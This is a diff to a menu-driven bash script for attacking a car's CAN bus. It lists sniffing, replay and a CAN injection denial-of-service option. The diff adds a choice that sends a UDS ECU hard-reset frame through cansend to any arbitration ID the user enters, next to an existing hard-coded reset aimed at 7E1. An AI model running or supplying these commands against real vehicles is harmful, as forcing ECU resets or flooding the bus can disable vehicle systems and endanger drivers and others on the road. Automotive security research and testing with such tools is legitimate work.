@@ -74,7 +74,8 @@ echo -e "$red [3]$green Start The Basic Sniffing"
 echo -e "$red [4]$green Record The CAN Packets"
 echo -e "$red [5]$green Play The CAN Packets"
 echo -e "$red [6]$green CAN Injection DOS Attack"
-echo -e "$red [7]$green ECU Hard Reset"
+echo -e "$red [7]$green ECU Hard Reset(7DF & 7E1 only)"
+echo -e "$red [8]$green ECU Hard Reset with Custom ID"
 
 echo -e "$red [0]$green Exit$reset"
 read -p " [?] Choose: " option
@@ -144,7 +145,16 @@ if [[ $option = 1 || $option = 01 ]]
          cansend $interface 7E1#0211010000000000
          clear
 		 menu
-		 	 	 
+		 	
+	elif [[ $option = 8 || $option = 08 ]]
+       then
+         echo -e " ──────────────────────────────"
+         msg="    ECU Hard Reset Packet Sent!"
+		 read -p "[?]Enter UDS Arbitary-ID:" AID
+         cansend $interface $AID#0211010000000000
+         clear
+		 menu
+		 
 	elif [[ $option = 0 || $option = 00 ]]
        then
          echo -e "[!]Exiting...${green}${reset}"
